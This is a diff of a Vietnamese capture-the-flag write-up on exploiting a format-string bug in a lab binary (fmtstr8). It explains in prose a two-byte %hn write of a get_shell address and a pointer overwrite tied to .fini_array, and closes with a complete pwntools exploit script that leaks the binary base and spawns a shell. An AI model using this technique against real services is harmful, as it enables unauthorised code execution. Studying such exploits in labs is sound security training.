@@ -374,9 +374,92 @@ Source: https://youtu.be/ZosW20QjET8?si=Js2CTy5OQO2r1X4u
 
 <img width="1646" height="270" alt="Screenshot 2026-11-23 222917" src="https://github.com/user-attachments/assets/22429494-d59d-4972-b504-f59abc247a35" />
 
-- Để ghi đè địa chỉ get_shell() vào thì mình cần ghi đè 2 byte mỗi lần (tránh lỗi và ghi quá lâu với 6 byte 1 lần), mình sẽ đưa vào package, mỗi lần lấy 2 byte mình sẽ dịch thêm 16 bit để lấy 2 byte kế tiếp
+- Để ghi đè địa chỉ get_shell() vào thì mình cần ghi đè 2 byte mỗi lần (tránh lỗi và ghi quá lâu với 6 byte 1 lần), mình sẽ đưa vào dictionary, mỗi lần lấy 2 byte mình sẽ dịch thêm 16 bit để lấy 2 byte kế tiếp
 
 <img width="780" height="251" alt="Screenshot 2026-11-24 142715" src="https://github.com/user-attachments/assets/2b554429-d373-4f36-8d1f-c58f9a9bdcbd" />
  
 - Sau đó mình cộnh thêm offset từ base tới vùng rw- mình muốn ghi vào. Và mình cũng cần cộng thêm 2 byte và 4 byte ở 2 lần ghi kế để nó ghi tới 2 byte sau của địa chỉ (nếu ko cộng nó sẽ ghi cả 3 lần đều vào 2 byte đầu của địa chỉ)
 
+<img width="857" height="667" alt="Screenshot 2026-11-24 152704" src="https://github.com/user-attachments/assets/de3d088d-4d40-4566-9098-279c2351f344" />
+
+
+<img width="1030" height="701" alt="Screenshot 2026-11-24 152638" src="https://github.com/user-attachments/assets/b7ddd57d-d0fe-4773-95f8-538dcdbe7a3e" />
+<img width="382" height="66" alt="Screenshot 2026-11-24 152810" src="https://github.com/user-attachments/assets/84b54506-1d98-49e3-a061-d52af85cc908" />
+- Làm 1 phép toán thì mình có thể tính được là cần thay đổi địa chỉ base là bao nhiêu. Và mình biết là mình cần ghi đè 2 byte cuối của base.
+- Mà trên Stack có sẵn con trỏ trỏ tới địa chỉ base rồi, mình sẽ tính offset tới con trỏ đó và ghi đè, đến khi kết thúc, chương trình sẽ láy địa chỉ base đó(đã bị thay đổi) rồi cộng offset(0x3d90) rồi nhảy tới get_shell
+
+### Final Script
+```
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./fmtstr8_patched",checksec=False)
+libc = ELF("./libc-2.31.so",checksec=False)
+ld = ELF("./ld-2.31.so",checksec=False)
+
+context.binary = exe
+
+
+if args.LOCAL:
+    p = process([exe.path])
+    if args.GDB:
+        gdb.attach(p, gdbscript='''
+            b*main+141
+            c
+            ''')
+else:
+    p = remote("127.0.0.1", 9997)
+
+
+#.fini_array offset: 0x3d90
+############################
+### Stage 1: Leak Binary ###
+############################
+
+p.sendlineafter(b'something: ', b'%23$p')
+p.recvuntil(b'You said: ')
+binary_leak = int(p.recvline(), 16)
+log.info("Binary Leak: " + hex(binary_leak))
+exe.address = binary_leak - exe.sym['main']
+#exe.address = binary_leak - 0x1267
+log.info("Exe Base Address: " + hex(exe.address))
+p.sendlineafter(b'> ', b'n')
+########################################
+### Stage 2: Write get_shell address ###
+########################################
+# offset rw- section 0x40f0
+# 0x1122 3344 5566
+package = {
+    (exe.sym['get_shell'] >> 0) & 0xffff: exe.address + 0x40f0,
+    (exe.sym['get_shell'] >> 16) & 0xffff: exe.address + 0x40f0 + 2,
+    (exe.sym['get_shell'] >> 32) & 0xffff: exe.address + 0x40f0 + 4,
+
+
+}
+order = sorted(package)
+print(hex(exe.sym['get_shell']))
+print(package)
+print(order)
+
+payload = f'%{order[0]}c%13$hn'.encode()
+payload += f'%{order[1] - order[0]}c%14$hn'.encode()
+payload += f'%{order[2] - order[1]}c%15$hn'.encode()
+payload = payload.ljust(64 - 24, b'P')
+payload += flat(
+    package[order[0]],
+    package[order[1]],
+    package[order[2]],
+    )
+
+p.sendlineafter(b'something: ', payload)
+p.sendlineafter(b'> ', b'n')
+####################################
+### Stage 3: Change base address ###
+####################################
+
+p.sendlineafter(b'something: ', f'%{(exe.address + 0x360) & 0xffff}c%38$hn'.encode())
+p.sendlineafter(b'> ', b'n')
+
+p.interactive()
+```
